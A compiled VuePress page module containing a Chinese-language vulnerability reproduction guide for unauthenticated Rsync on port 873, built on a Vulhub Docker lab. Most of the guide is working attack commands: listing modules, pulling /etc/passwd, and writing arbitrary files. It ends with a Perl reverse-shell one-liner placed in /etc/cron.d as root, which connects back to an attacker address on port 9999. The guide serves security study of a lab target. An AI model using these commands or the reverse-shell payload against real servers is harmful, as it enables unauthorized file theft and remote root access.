import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as a,c as n,e as s}from"./app-58e4a7d6.js";const i={},t=s(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>Rsync是Linux下一款数据备份工具，支持通过rsync协议、ssh协议进行远程文件传输。其中rsync协议默认监听873端口，如果目标开启了rsync服务，并且没有配置ACL或访问密码，我们将可以读写目标服务器文件。</p><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub编译及运行Rsync服务器：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose build
docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>环境启动后，可以使用Rsync命令访问：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>rsync rsync://your-ip:873/
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203031338267.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><blockquote><p>若Vulhub环境启动时报错<code>standard_init_linux.go:211: exec user process caused &quot;no such file or directory&quot;</code>，执行命令 <code>dos2unix docker-entrypoint.sh</code>，即可成功启动。</p></blockquote><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>访问建立后，可以查看模块名列表，有一个src模块，我们再列出这个模块下的文件：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>rsync rsync://your-ip:873/src/
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>这是一个Linux根目录，我们可以下载任意文件：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>rsync -av rsync://your-ip:873/src/etc/passwd ./
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>或者写入任意文件：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>rsync -av shell rsync://your-ip:873/src/etc/cron.d/shell
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3 id="反弹shell" tabindex="-1"><a class="header-anchor" href="#反弹shell" aria-hidden="true">#</a> 反弹shell</h3><p>写入cron任务反弹shell。</p><p>shell文件内容如下：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code># 此处指定用户root不可省略
* * * * * root perl -e &#39;use Socket;$i=&quot;192.168.174.128&quot;;$p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>上传shell文件触发反弹shell：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>rsync -av shell rsync://192.168.174.128:873/src/etc/cron.d/shell
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203031407618.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,23),d=[t];function r(c,l){return a(),n("div",null,d)}const p=e(i,[["render",r],["__file","Rsync 未授权访问漏洞.html.vue"]]);export{p as default};
